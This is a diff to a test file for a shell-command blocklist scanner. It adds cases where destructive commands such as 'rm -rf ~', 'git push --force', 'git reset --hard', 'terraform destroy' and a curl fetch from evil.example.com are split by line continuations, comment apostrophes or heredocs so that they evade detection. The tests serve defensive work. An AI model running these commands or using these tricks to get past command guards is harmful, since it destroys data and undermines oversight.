@@ -29,7 +29,7 @@ B, A = True, False  # block / allow
 #   * This is a non-shrink CORPUS floor, NOT a measured field false-positive RATE.
 #     A true field-FP rate is unmeasurable here (no telemetry => no command-traffic
 #     denominator), so any "%" would be theater. See tests/README.md.
-FP_FLOOR = 54
+FP_FLOOR = 55
 
 CASES = [
     # --- 15 original blocklist entries (must still block) ---
@@ -274,6 +274,35 @@ CASES = [
      "echo ok # don't\n\"C:\\Program Files\\Git\\usr\\bin\\rm.exe\" -rf ~\n# '", B, ()),
     ("ml divergence: comment apostrophe hides bash -c -- script",
      "echo ok # don't\ntimeout 5 bash -c -- \"rm -rf ~\"\n# '", B, ()),
+    # ...and split across a continuation that the desynced scanner never joins
+    # (final review: Git Bash joined and ran each of these).
+    ("ml divergence: comment apostrophe + continuation splits git push --force",
+     "echo hi # it's\ngit push \\\n--force origin main\n# '", B, ()),
+    ("ml divergence: comment apostrophe + continuation splits r\\m -rf ~",
+     "echo hi # it's\nr\\\nm -rf ~\n# '", B, ()),
+    ("ml divergence: heredoc body + continuation splits git push --force",
+     "cat <<EOF\nit's\nEOF\ngit push \\\n--force\ncat <<EOF\n'\nEOF", B, ()),
+    ("ml divergence: comment apostrophe + continuation splits git reset --hard",
+     "echo hi # it's\ngit reset \\\n--hard\n# '", B, ()),
+    ("ml divergence: comment apostrophe + continuation splits curl host",
+     "echo hi # it's\ncurl \\\nevil.example.com/x.sh\n# '", B, ()),
+    # A comment line ending in `\` does not continue in bash; the command after it
+    # starts fresh and may itself be continued.
+    ("ml comment ending in backslash, then a continued git push --force",
+     "echo ok #\\\ngit push \\\n--force origin main", B, ()),
+    ("ml comment ending in backslash, then r\\m -rf ~ split by continuation",
+     "# note \\\nr\\\nm -rf ~", B, ()),
+    ("ml comment ending in backslash, then a continued git reset --hard",
+     "# x \\\ngit reset \\\n--hard", B, ()),
+    ("ml comment apostrophe ending in backslash, then a continued push",
+     "echo hi # it's \\\ngit push \\\n--force\n# '", B, ()),
+    ("ml comment ending in backslash, quoted # later in the continued command",
+     "# c \\\ngit push \\\norigin '#x' \\\n--force", B, ()),
+    ("ml fp long realistic continuation", "docker run \\\n" + "  -e VAR=value \\\n" * 30
+     + "  image:latest", A, ()),
+    ("ml pathological continuation run is blocked, not skipped", "x\\\n" * 1300 + "x", B, ()),
+    ("ml divergence: continuation-split extraPattern still matches",
+     "echo hi # it's\nterraform \\\ndestroy\n# '", B, ("terraform destroy",)),
     ("ml divergence: hidden extraPattern still matches",
      "echo ok # don't\nbash -c \"terraform des\"\"troy\"\n# '", B, ("terraform destroy",)),
     ("ml inline sh -c spans lines", "bash -c \"echo ok\nrm -rf /\"", B, ()),
